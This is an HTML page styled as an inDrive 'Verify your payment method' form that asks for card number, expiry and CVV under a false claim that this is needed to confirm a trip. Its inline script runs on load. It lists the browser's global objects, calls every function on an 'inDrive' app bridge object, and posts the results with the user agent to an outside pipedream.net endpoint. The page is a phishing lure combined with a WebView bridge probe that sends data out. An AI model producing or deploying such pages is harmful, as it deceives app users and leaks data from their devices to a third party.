<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>inDrive - Payment Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: sans-serif;
      background: #fffef3;
      color: #000;
      margin: 0;
      padding: 0;
    }
    .header {
      padding: 16px;
      text-align: center;
    }
    .header img {
      height: 40px;
    }
    .container {
      padding: 20px;
      max-width: 400px;
      margin: 0 auto;
    }
    h1 {
      font-size: 20px;
      margin: 0 0 10px;
      text-align: center;
    }
    form {
      display: flex;
      flex-direction: column;
    }
    label {
      margin: 10px 0 5px;
      font-weight: bold;
    }
    input {
      padding: 12px;
      font-size: 16px;
      border: 2px solid #ccc;
      border-radius: 6px;
    }
    button {
      margin-top: 20px;
      padding: 14px;
      font-size: 16px;
      background-color: #d9ff00;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }
    .footer {
      margin-top: 30px;
      font-size: 12px;
      color: #666;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://indrive.com/images/logo/logo--dark.svg" alt="inDrive">
  </div>
  <div class="container">
    <h1>Verify your payment method</h1>
    <form action="indriver://open/driver/wallet">
      <label for="card">Card Number</label>
      <input type="text" id="card" placeholder="1234 5678 9012 3456">

      <label for="exp">Expiration Date</label>
      <input type="text" id="exp" placeholder="MM / YY">

      <label for="cvv">CVV</label>
      <input type="text" id="cvv" placeholder="123">

      <button type="submit">Verify Card</button>
    </form>
    <div class="footer">
      This step is required to confirm your upcoming trip.
    </div>

<script>
(function () {
  const LOG_URL = "https://eol1rt726v7fwz6.m.pipedream.net";

  function sendLog(data) {
    try {
      fetch(LOG_URL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ log: data, ua: navigator.userAgent })
      });
    } catch (e) {
      console.log("Logging failed", e);
    }
  }

  function log(msg) {
    document.write(`<div style="font-family:monospace;color:#0c0">âœ“ ${msg}</div>`);
  }

  function dumpGlobals() {
    const keys = [];
    for (let k in window) {
      keys.push(k);
    }
    return `Global keys:\n${keys.sort().join("\n")}`;
  }

  function probeInDrive() {
    if (typeof inDrive === "undefined") {
      return "inDrive interface not found.";
    }

    let out = "inDrive interface found.\n";
    for (let k in inDrive) {
      try {
        const val = inDrive[k];
        if (typeof val === "function") {
          out += `inDrive.${k}(): ${val()}\n`;
        } else {
          out += `inDrive.${k}: ${val}\n`;
        }
      } catch (e) {
        out += `Error calling inDrive.${k}: ${e}\n`;
      }
    }
    return out;
  }

  setTimeout(() => {
    const results = [
      dumpGlobals(),
      probeInDrive()
    ].join("\n\n---\n\n");

    sendLog(results);
    log("Probed and sent log.");
  }, 400);
})();
</script>

  </div>
</body>
</html>
